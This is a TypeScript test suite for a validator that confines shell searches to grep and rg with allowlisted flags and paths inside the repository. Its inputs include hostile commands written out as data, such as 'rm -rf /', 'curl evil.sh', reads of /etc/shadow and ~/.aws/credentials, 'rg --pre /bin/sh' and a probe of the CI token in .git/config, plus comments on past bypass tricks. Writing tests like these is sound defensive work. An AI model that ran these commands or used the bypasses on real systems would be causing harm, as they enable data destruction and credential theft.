import { describe, expect, it } from "vitest";

import {
  isSafeSearchCommand,
  parseSearchCommand,
  reachabilityPlan,
} from "./commandSafety";

describe("isSafeSearchCommand", () => {
  it("allows a plain grep", () => {
    expect(isSafeSearchCommand("grep -rn '@shareable' services/")).toEqual({
      safe: true,
    });
  });

  it("allows rg", () => {
    expect(isSafeSearchCommand("rg --count-matches foo libs/")).toEqual({
      safe: true,
    });
  });

  it("allows a grep-to-grep pipeline", () => {
    expect(isSafeSearchCommand("grep -rn 'x' services/ | grep enum")).toEqual({
      safe: true,
    });
  });

  it.each([
    ["chaining with ;", "grep -rn 'x' . ; rm -rf /"],
    ["chaining with &&", "grep -rn 'x' . && curl evil.sh"],
    ["chaining with ||", "grep -rn 'x' . || echo pwned"],
    ["command substitution", 'grep -rn "$(whoami)" .'],
    ["redirection out", "grep -rn 'x' . > /etc/passwd"],
    ["redirection in", "grep -rn pattern < /etc/passwd"],
  ])("rejects %s", (_label, command) => {
    const verdict = isSafeSearchCommand(command);
    expect(verdict.safe).toBe(false);
  });

  it("rejects a backtick", () => {
    const verdict = isSafeSearchCommand("grep -rn `whoami` .");
    expect(verdict.safe).toBe(false);
  });

  it("rejects a non-allowlisted binary even without metacharacters", () => {
    const verdict = isSafeSearchCommand("cat /etc/passwd");
    expect(verdict).toEqual({
      safe: false,
      reason: "segment 'cat /etc/passwd' does not begin with grep or rg",
    });
  });

  it("rejects a dangerous binary hidden in a later pipeline segment", () => {
    const verdict = isSafeSearchCommand("grep -rn 'x' . | xargs rm");
    expect(verdict.safe).toBe(false);
  });

  it("rejects a binary whose name merely starts with grep", () => {
    const verdict = isSafeSearchCommand("grepevil -rn x .");
    expect(verdict.safe).toBe(false);
  });

  it("rejects an empty command", () => {
    expect(isSafeSearchCommand("   ")).toEqual({
      safe: false,
      reason: "command is empty",
    });
  });
});

describe("isSafeSearchCommand — flag allowlist", () => {
  // Allowlisting the binary is not enough: these all begin with `rg`.
  it.each([
    ["--pre executes an arbitrary command per file", "rg --pre /bin/sh needle file.ts"],
    ["--pre with = form", "rg --pre=/bin/sh needle file.ts"],
    ["--pre-glob", "rg --pre-glob '*.ts' needle src/"],
    ["--hostname-bin executes a binary", "rg --hostname-bin /bin/sh needle src/"],
    ["-z shells out to decompressors", "rg -z needle src/"],
    ["--search-zip", "rg --search-zip needle src/"],
    ["-f reads an arbitrary pattern file", "rg -f /etc/passwd src/"],
    ["--file reads an arbitrary pattern file", "rg --file /etc/passwd src/"],
    ["--ignore-file reads an arbitrary file", "rg --ignore-file /etc/passwd needle src/"],
    ["--files turns the check into a directory oracle", "rg --files src/"],
    ["-L follows symlinks out of the repo", "rg -L needle src/"],
  ])("refuses rg %s", (_label, command) => {
    expect(isSafeSearchCommand(command).safe).toBe(false);
  });

  it.each([
    ["-f reads an arbitrary pattern file", "grep -rn -f /etc/passwd src/"],
    ["--exclude-from reads an arbitrary file", "grep -rn --exclude-from=/etc/passwd x src/"],
    ["-q makes every absence claim trivially zero", "grep -rq needle src/"],
  ])("refuses grep %s", (_label, command) => {
    expect(isSafeSearchCommand(command).safe).toBe(false);
  });

  it("refuses an unknown flag rather than passing it through", () => {
    const verdict = isSafeSearchCommand("rg --some-new-flag needle src/");
    expect(verdict.safe).toBe(false);
    if (!verdict.safe) expect(verdict.reason).toContain("allowlist");
  });

  it("refuses a dangerous flag hidden in a short cluster", () => {
    expect(isSafeSearchCommand("rg -inz needle src/").safe).toBe(false);
  });

  it("still allows the ordinary search flags authors actually use", () => {
    for (const command of [
      "grep -rn --include='*.graphqls' '@shareable' services/",
      "grep -rn -e 'pattern with spaces' src/",
      "rg -n --glob '!*.test.ts' 'createUser' src/",
      "rg --count-matches -t ts legacyHelper src/",
      "grep -rn 'x' services/ | grep enum",
      "grep -rnA3 needle src/",
    ]) {
      expect(isSafeSearchCommand(command), command).toEqual({ safe: true });
    }
  });
});

describe("isSafeSearchCommand — path operands", () => {
  it.each([
    ["absolute path", "grep -rc AKIAZZTOPSECRET /etc/shadow"],
    ["traversal", "grep -rc secret ../../../etc/shadow"],
    ["home-relative", "grep -rc secret ~/.aws/credentials"],
    ["absolute path behind -e", "grep -rc -e secret /etc/shadow"],
    ["absolute path in a later segment", "grep -rn x src/ | grep -c y /etc/shadow"],
    ["rg absolute path", "rg --count secret /etc/shadow"],
  ])("refuses %s — the absence lane is a file-probe oracle without this", (_label, command) => {
    expect(isSafeSearchCommand(command).safe).toBe(false);
  });

  it("refuses an absolute-looking token even in pattern position", () => {
    // A deliberate trade-off. Whether a word is a pattern or an operand depends
    // on the per-flag arity table, and one wrong entry there turns a path into
    // an unchecked "flag value" — that is exactly how `--color /etc/shadow`
    // escaped. Refusing the token wherever it appears makes containment
    // independent of the table. Cost: a regex that looks like an absolute path
    // is refused, loudly and with a fixable message.
    const verdict = isSafeSearchCommand("grep -rn /etc/passwd src/");
    expect(verdict.safe).toBe(false);
    if (!verdict.safe) expect(verdict.reason).toContain("absolute path");
    // The relative form is the way to write it.
    expect(isSafeSearchCommand("grep -rn etc/passwd src/")).toEqual({ safe: true });
  });

  it("refuses variable expansion outside single quotes", () => {
    expect(isSafeSearchCommand("grep -rc AKIA $SECRET_FILE").safe).toBe(false);
    expect(isSafeSearchCommand('grep -rc "$SECRET_FILE" src/').safe).toBe(false);
  });

  it("allows $ as a regex anchor inside single quotes", () => {
    expect(isSafeSearchCommand("grep -rn 'foo$' src/")).toEqual({ safe: true });
  });
});

describe("parseSearchCommand", () => {
  it("hands back argv, never a command string", () => {
    const result = parseSearchCommand("grep -rn 'two words' src/");
    expect(result.safe).toBe(true);
    if (result.safe) {
      // Canonical form: clusters split, `--` before the operands.
      expect(result.plan.segments).toEqual([
        {
          binary: "grep",
          args: ["-r", "-n", "--", "two words", "src/"],
          patternIndex: 3,
          pathIndices: [4],
        },
      ]);
    }
  });

  it("splits a pipeline into separately validated segments", () => {
    const result = parseSearchCommand("grep -rn x src/ | grep enum");
    expect(result.safe).toBe(true);
    if (result.safe) expect(result.plan.segments).toHaveLength(2);
  });

  it("rejects an unterminated quote instead of guessing", () => {
    expect(parseSearchCommand("grep -rn 'unclosed src/").safe).toBe(false);
  });
});

describe("reachabilityPlan", () => {
  it("keeps the scope and substitutes a match-anything pattern", () => {
    const parsed = parseSearchCommand("grep -rn --include=*.ts legacyRetryHelper src/");
    expect(parsed.safe).toBe(true);
    if (!parsed.safe) return;

    const control = reachabilityPlan(parsed.plan);
    expect(control).not.toBeNull();
    const args = control?.segments[0]?.args ?? [];
    expect(args).toContain("--include");
    expect(args).toContain("src/");
    expect(args).not.toContain("legacyRetryHelper");
    expect(args[control?.segments[0]?.patternIndex ?? -1]).toBe(".");
  });

  it("drops flags that would narrow what the control pattern matches", () => {
    const parsed = parseSearchCommand("grep -rnwF legacyRetryHelper src/");
    expect(parsed.safe).toBe(true);
    if (!parsed.safe) return;

    const args = reachabilityPlan(parsed.plan)?.segments[0]?.args ?? [];
    expect(args).not.toContain("-w");
    expect(args).not.toContain("-F");
    expect(args).toContain("-r");
  });

  it("finds the pattern even when the author wrote it inline", () => {
    // -ePAT used to leave the pattern fused to its flag, which silently
    // disabled the control and let a forged absence claim pass clean.
    const parsed = parseSearchCommand("grep -rn -eAWS_SECRET_ACCESS_KEY src/");
    expect(parsed.safe).toBe(true);
    if (!parsed.safe) return;

    const control = reachabilityPlan(parsed.plan);
    expect(control).not.toBeNull();
    expect(control?.segments[0]?.args).not.toContain("AWS_SECRET_ACCESS_KEY");
  });
});

describe("isSafeSearchCommand — optional-value flags", () => {
  it("refuses a path smuggled past the guard as a --color value", () => {
    // grep's --color takes an OPTIONAL value, so getopt only accepts it in the
    // `=` form and grep never consumes the following word. A validator that
    // thinks --color takes a separate value swallows the next word as a flag
    // value, and the word never reaches the path guard — while grep reads it
    // as a file. That restored the full file-probe oracle.
    const verdict = isSafeSearchCommand('grep -e "^root:" --color /etc/shadow');
    expect(verdict.safe).toBe(false);
  });

  it("keeps the inline form working", () => {
    expect(isSafeSearchCommand("grep -rn --color=never needle src/")).toEqual({
      safe: true,
    });
  });

  it("treats the word after --color as an operand, like grep does", () => {
    const result = parseSearchCommand("grep -e needle --color src/app.ts");
    expect(result.safe).toBe(true);
    if (result.safe) {
      const segment = result.plan.segments[0];
      // src/app.ts is a PATH — path-checked — not a value of --color.
      expect(segment?.pathIndices.length).toBe(1);
      expect(segment?.args[segment.pathIndices[0] ?? -1]).toBe("src/app.ts");
    }
  });
});

describe("isSafeSearchCommand — per-binary flag meanings", () => {
  it("allows grep -L, which is --files-without-match", () => {
    expect(isSafeSearchCommand("grep -rL needle src/")).toEqual({ safe: true });
  });

  it("still refuses rg -L, which is --follow", () => {
    const verdict = isSafeSearchCommand("rg -L needle src/");
    expect(verdict.safe).toBe(false);
    if (!verdict.safe) expect(verdict.reason).toContain("symlink");
  });

  it("allows grep -z, which is --null-data", () => {
    expect(isSafeSearchCommand("grep -rz needle src/")).toEqual({ safe: true });
  });

  it("still refuses rg -z, which is --search-zip", () => {
    expect(isSafeSearchCommand("rg -z needle src/").safe).toBe(false);
  });

  it("refuses grep -R, which follows symlinks out of the repo", () => {
    const verdict = isSafeSearchCommand("grep -Rn needle .");
    expect(verdict.safe).toBe(false);
    if (!verdict.safe) expect(verdict.reason).toContain("symlink");
    // Plain -r does not follow, and stays allowed.
    expect(isSafeSearchCommand("grep -rn needle .")).toEqual({ safe: true });
  });
});

describe("isSafeSearchCommand — vacuous searches", () => {
  it.each([
    ["rg -m 0 needle src/"],
    ["rg --max-count=0 needle src/"],
    ["rg --max-depth 0 needle src/"],
    ["rg --max-filesize 0 needle src/"],
  ])("refuses %s, which matches nothing regardless of the pattern", (command) => {
    expect(isSafeSearchCommand(command).safe).toBe(false);
  });

  it("allows a real limit", () => {
    expect(isSafeSearchCommand("rg -m 5 needle src/")).toEqual({ safe: true });
  });
});

describe("isSafeSearchCommand — .git and null bytes", () => {
  it("refuses a search of .git, which holds the CI token", () => {
    // actions/checkout persists an `AUTHORIZATION: basic <token>` header into
    // .git/config by default. Anchors are unlimited per document, and each one
    // is a single bit of an extraction oracle.
    expect(isSafeSearchCommand('grep -c "basic A" .git/config').safe).toBe(false);
  });

  it("refuses a NUL inside single quotes rather than crashing the runner", () => {
    // The quote branches copied every character verbatim, so a NUL reached
    // spawnSync and threw an uncaught TypeError, killing the whole run.
    expect(isSafeSearchCommand("grep -e 'a\0b' src/").safe).toBe(false);
  });
});

describe("reachabilityPlan — operands are not flags", () => {
  it("keeps a file operand that happens to be named like a flag", () => {
    // Everything after `--` is an operand. Dropping a file literally named
    // `-F` as a "pattern-semantic flag" removed a path from the searched set
    // and shifted every later index, so pathIndices pointed at `--`.
    const parsed = parseSearchCommand("grep -rn -e zzz -- -F src");
    expect(parsed.safe).toBe(true);
    if (!parsed.safe) return;

    const control = reachabilityPlan(parsed.plan);
    expect(control).not.toBeNull();
    const segment = control?.segments[0];
    expect(segment?.args).toContain("-F");
    // Every recorded path index must actually point at a path.
    const pathed = (segment?.pathIndices ?? []).map((index) => segment?.args[index]);
    expect(pathed).toEqual(["-F", "src"]);
  });

  it("still drops pattern-semantic flags that really are flags", () => {
    const parsed = parseSearchCommand("grep -rnwF needle src/");
    expect(parsed.safe).toBe(true);
    if (!parsed.safe) return;

    const segment = reachabilityPlan(parsed.plan)?.segments[0];
    expect(segment?.args).not.toContain("-w");
    expect(segment?.args).not.toContain("-F");
    const pathed = (segment?.pathIndices ?? []).map((index) => segment?.args[index]);
    expect(pathed).toEqual(["src/"]);
  });
});
